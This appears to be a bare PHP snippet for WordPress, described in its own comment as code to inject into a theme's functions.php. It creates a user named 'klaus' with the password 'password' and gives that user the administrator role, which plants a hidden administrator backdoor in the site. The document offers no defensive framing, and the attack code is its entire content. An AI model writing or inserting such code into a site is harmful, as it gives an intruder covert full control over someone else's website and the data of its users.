<?php
//Inject account in function.php
$user_id = wp_create_user( 'klaus', 'password', 'klauz@email.com' );
$wp_user_object = new WP_User($user_id);
$wp_user_object->set_role('administrator');